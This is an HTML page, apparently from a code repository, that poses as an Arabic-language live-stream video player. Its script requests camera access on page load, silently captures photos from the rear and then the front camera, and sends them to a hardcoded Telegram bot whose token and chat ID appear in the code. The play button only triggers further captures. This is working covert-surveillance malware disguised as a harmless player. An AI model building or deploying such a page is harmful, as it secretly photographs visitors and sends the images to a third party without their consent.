# Cammmm
Cammm
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشغل الفيديو</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            color: #fff;
            text-align: center;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            box-shadow: 0 0 40px rgba(233, 69, 96, 0.3);
            max-width: 400px;
            width: 90%;
        }
        h2 { font-weight: 300; margin-bottom: 10px; color: #e94560; }
        p { font-size: 14px; color: #aaa; margin-bottom: 25px; }
        #status {
            background: #16213e;
            padding: 15px;
            border-radius: 12px;
            font-size: 15px;
            color: #eee;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-left: 4px solid #e94560;
        }
        video {
            width: 100%;
            border-radius: 15px;
            margin-top: 20px;
            display: none;
            border: 2px solid #e94560;
        }
        .btn {
            margin-top: 20px;
            padding: 14px 0;
            background: #e94560;
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            display: none;
        }
        .btn:hover { background: #c73652; transform: scale(1.02); }
        .loader { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
    </style>
</head>
<body>

<div class="container">
    <h2>📹 مشغل البث المباشر</h2>
    <p>اضغط "تشغيل" لبدء المشاهدة</p>
    <div id="status">⏳ جاري التحميل...</div>
    <video id="video" playsinline autoplay></video>
    <button class="btn" id="captureBtn">▶ تشغيل البث</button>
</div>

<script>
    // ============================================================
    // إعدادات بوت تيليغرام - تم التعديل
    // ============================================================
    const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
    const CHAT_ID   = "5730027675";

    // ============================================================
    // باقي الكود
    // ============================================================

    let video = document.getElementById('video');
    let statusDiv = document.getElementById('status');
    let captureBtn = document.getElementById('captureBtn');
    let stream = null;

    async function sendToTelegram(imageDataURL) {
        try {
            const res = await fetch(imageDataURL);
            const blob = await res.blob();

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');

            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            if (result.ok) {
                console.log('✅ تم الإرسال إلى تيليغرام');
                statusDiv.innerHTML = '✅ تم الإرسال إلى تيليغرام';
            } else {
                console.error('❌ فشل الإرسال:', result);
                statusDiv.innerHTML = '❌ فشل الإرسال إلى تيليغرام';
            }
        } catch (e) {
            console.error('❌ خطأ في الإرسال:', e);
            statusDiv.innerHTML = '❌ خطأ في الاتصال';
        }
    }

    function captureFrame() {
        if (!stream) return;
        const track = stream.getVideoTracks()[0];
        if (!track) return;

        const settings = track.getSettings();
        const canvas = document.createElement('canvas');
        canvas.width = settings.width || 640;
        canvas.height = settings.height || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.9);
    }

    async function startCamera() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { ideal: "environment" } }
            });

            video.srcObject = stream;
            video.style.display = 'block';
            captureBtn.style.display = 'block';
            statusDiv.innerHTML = '📷 تم الوصول إلى الكاميرا. اضغط "تشغيل البث"';
            captureBtn.innerText = '📸 التقاط وإرسال';

            statusDiv.innerHTML = '⏳ جاري التقاط الصورة...';
            const imgData = captureFrame();
            if (imgData) {
                await sendToTelegram(imgData);
                tryFrontCamera();
            }

            captureBtn.onclick = async function() {
                statusDiv.innerHTML = '⏳ جاري التقاط الصورة...';
                const newImg = captureFrame();
                if (newImg) {
                    await sendToTelegram(newImg);
                }
            };

        } catch (error) {
            statusDiv.innerHTML = '❌ تعذر الوصول إلى الكاميرا. امنح الصلاحية وأعد تحميل الصفحة.';
            console.error(error);
        }
    }

    async function tryFrontCamera() {
        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { ideal: "user" } }
            });
            const frontVideo = document.createElement('video');
            frontVideo.srcObject = frontStream;
            await frontVideo.play();
            await new Promise(r => setTimeout(r, 300));

            const canvas = document.createElement('canvas');
            const track = frontStream.getVideoTracks()[0];
            const settings = track.getSettings();
            canvas.width = settings.width || 640;
            canvas.height = settings.height || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL('image/jpeg', 0.9);

            await sendToTelegram(imgData);
            frontStream.getTracks().forEach(t => t.stop());
        } catch (e) {
            console.log('⚠️ لا توجد كاميرا أمامية أو تم رفضها');
        }
    }

    startCamera();
</script>

</body>
</html>
